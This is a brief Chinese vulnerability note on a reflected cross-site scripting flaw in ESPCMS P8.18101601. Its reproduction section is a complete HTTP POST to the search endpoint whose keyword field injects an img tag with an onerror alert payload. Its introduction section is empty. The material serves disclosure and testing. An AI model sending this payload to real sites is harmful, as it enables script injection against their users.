ESPCMS 前台反射型xss
====================

一、漏洞简介
------------

二、漏洞影响
------------

ESPCMS P8.18101601

三、复现过程
------------

    POST /index.php?ac=Search&at=List HTTP/1.1
    Host: www.0-sec.org
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 46
    Origin: https://www.0-sec.org
    Connection: close
    Referer: https://www.0-sec.org8/index.php?ac=Search&at=List
    Cookie: zerosec; 

    mid=0&keyword="><img src=1 onerror=alert(1)><"
